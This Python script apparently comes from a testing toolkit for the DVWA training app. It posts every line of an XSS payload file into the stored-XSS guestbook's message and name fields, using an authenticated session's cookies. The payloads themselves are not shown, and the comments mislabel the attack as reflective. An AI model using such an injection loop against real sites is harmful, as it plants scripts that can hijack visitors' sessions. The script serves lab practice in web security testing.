import configparser
from requests.compat import urljoin
import requests


xss_sto_path = 'vulnerabilities/xss_s/'
config = configparser.ConfigParser()
config.read('config.ini')

data = {
    'btnSign': "Sign+Guestbook",
    'mtxMessage': "",
    'txtName': ""
}


# Stored XSS
def attack(session):
    xss_file = config["xss"]["file"]
    xsss_url = urljoin(session.get_base_url(), xss_sto_path)
    xss_param_values = []
    xss_param_values.extend(open(xss_file, "r", errors='replace').readlines())

    # Reflective XSS on the message
    data["txtName"] = "Just testing, really..."
    for v in xss_param_values:
        data["mtxMessage"] = v
        # Send message reflected xss
        r = requests.post(xsss_url, data=data, cookies=session.get_cookies())

    # Reflective XSS on the name
    data["mtxMessage"] = "I'm doing nothing wrong..."
    for v in xss_param_values:
        data["txtName"] = v
        # Send message reflected xss
        r = requests.post(xsss_url, data=data, cookies=session.get_cookies())